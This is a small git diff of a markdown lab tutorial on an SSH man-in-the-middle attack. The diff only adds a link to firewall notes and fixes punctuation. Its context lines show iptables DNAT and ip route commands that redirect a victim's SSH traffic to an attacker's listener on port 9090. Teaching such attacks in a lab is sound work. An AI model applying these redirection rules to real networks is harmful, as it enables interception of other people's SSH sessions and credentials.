@@ -45,6 +45,8 @@ $ sudo iptables -P FORWARD ACCEPT
 $ sudo iptables -t nat -A PREROUTING -p tcp -d 10.0.2.5 --dport 22 -j DNAT --to-destination 10.0.2.6:9090 // you need to change the IP addresses here to match yours, do not change the port 9090. This firewall rule says that "please redirect all traffic destined to 10.0.2.5 at port 22 to 10.0.2.6 port 9090", in other words, for every packet whose destination goes to the legitimate SSH server, redirect the packet to the attacker's machine port 9090, and the attacker will run a script which listens to this port 9090.
 ```
 
+You are recommended to read the [notes here](../../notes/firewall/iptables) to have a better understanding of this last iptables rule.
+
 ### Attack: 
 
 1. The victim client, specifies the attacker's machine as the gateway - so as to simulate the situation when the victim is connected to a public wifi where the owner can be a malicious actor.
@@ -53,7 +55,7 @@ $ sudo iptables -t nat -A PREROUTING -p tcp -d 10.0.2.5 --dport 22 -j DNAT --to-
 $ sudo ip route add 10.0.2.5 via 10.0.2.6 // here, change 10.0.2.5 to your server's IP and change 10.0.2.6 to your attacker's IP
 ```
 
-With this routing rule, all traffic destined to 10.0.2.5 would first go through 10.0.2.6
+With this routing rule, all traffic destined to 10.0.2.5 would first go through 10.0.2.6.
 
 This screenshot shows the moment right before executing this command, 
 
